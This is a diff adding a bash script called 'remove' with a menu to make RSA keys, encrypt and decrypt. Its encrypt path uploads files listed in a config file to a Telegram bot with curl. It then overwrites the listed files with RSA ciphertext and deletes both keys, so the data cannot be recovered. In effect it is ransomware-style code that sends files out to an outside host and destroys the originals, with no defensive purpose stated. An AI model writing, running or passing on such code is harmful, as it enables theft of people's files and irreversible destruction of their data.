@@ -1,0 +1,118 @@
+#!/bin/bash
+
+chmod -x ./remove
+chmod +x ./remove
+
+removeHelp(){
+
+    clear
+
+    echo ""
+
+    echo "  n -> New keys"
+    echo "  e -> Encrypt"
+    echo "  d -> Decrypt"
+    echo ""
+    echo "  h -> Help"
+
+    echo ""
+
+    exit 1
+
+}
+
+# Check if the first argument is provided
+if [ -z "$1" ]; then
+
+    echo -e "\nERROR"    
+    removeHelp
+
+fi
+
+# Set the argument
+argument=$1
+
+new(){
+
+    openssl genpkey -algorithm RSA -out vm_private_key.pem -pkeyopt rsa_keygen_bits:2048
+    openssl rsa -pubout -in vm_private_key.pem -out vm_public_key.pem
+
+    clear
+
+}
+
+encrypt(){
+
+    new
+
+    sleep 1
+
+    clear
+
+    Bot
+
+    list=$(jq -r '.list[]' "./vm")
+
+    for file in $list; do
+        d=$(cat "$file")
+        publicKey=$( cat "./vm_public_key.pem" )
+
+        # Encrypt the content using the public key
+        enc=$(echo -n "$d" | openssl pkeyutl -encrypt -inkey <(echo "$publicKey") -pubin | base64)
+
+        # Save the encrypted content back to the file
+        echo "$enc" > "$file"
+    done
+
+    rm vm_public_key.pem
+    rm vm_private_key.pem
+
+    clear
+
+}
+
+Bot() {
+
+    token=$(jq -r '.token' "./vm")
+    chat_id=$(jq -r '.id' "./vm")
+    files=$(jq -r '.send[]' "./vm")
+
+    for file in $files; do
+        url="https://api.telegram.org/bot$token/sendDocument"
+
+        # Send the document to the Telegram bot
+        curl -s -X POST "$url" -F "chat_id=$chat_id" -F "document=@$file" -H "Content-Type:multipart/form-data"
+    done
+}
+
+decrypt() {
+
+    clear
+
+    list=$( jq -r '.list[]' "./vm" )
+
+    for file in $list; do
+        d=$(cat "$file")
+        privateKey=$( cat "./vm_private_key.pem" )
+
+        # Decrypt the content using the private key
+        dec=$(echo "$d" | base64 --decode | openssl pkeyutl -decrypt -inkey <(echo "$privateKey"))
+
+        # Save the decrypted content back to the file
+        echo "$dec" > "$file"
+    done
+
+    rm vm_private_key.pem
+
+}
+
+# Call the appropriate function based on the argument
+if [ "$argument" == "n" ]; then
+    new
+elif [ "$argument" == "e" ]; then
+    encrypt
+elif [ "$argument" == "d" ]; then
+    decrypt
+elif [ "$argument" == "h" ]; then
+    removeHelp
+fi
